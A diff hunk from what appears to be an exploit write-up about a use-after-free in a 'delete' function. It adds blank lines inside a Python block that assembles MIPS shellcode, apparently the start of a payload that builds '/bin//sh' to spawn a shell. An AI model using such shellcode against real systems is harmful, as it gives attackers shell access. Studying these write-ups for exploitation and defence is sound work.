@@ -50,8 +50,11 @@ delete存在uaf漏洞
 
 ```python
 shellcode  = b""
+
 shellcode += b"\xff\xff\x06\x28"  # slti $a2, $zero, -1
+
 shellcode += b"\x62\x69\x0f\x3c"  # lui $t7, 0x6962
+
 shellcode += b"\x2f\x2f\xef\x35"  # ori $t7, $t7, 0x2f2f
 shellcode += b"\xf4\xff\xaf\xaf"  # sw $t7, -0xc($sp)
 shellcode += b"\x73\x68\x0e\x3c"  # lui $t6, 0x6873
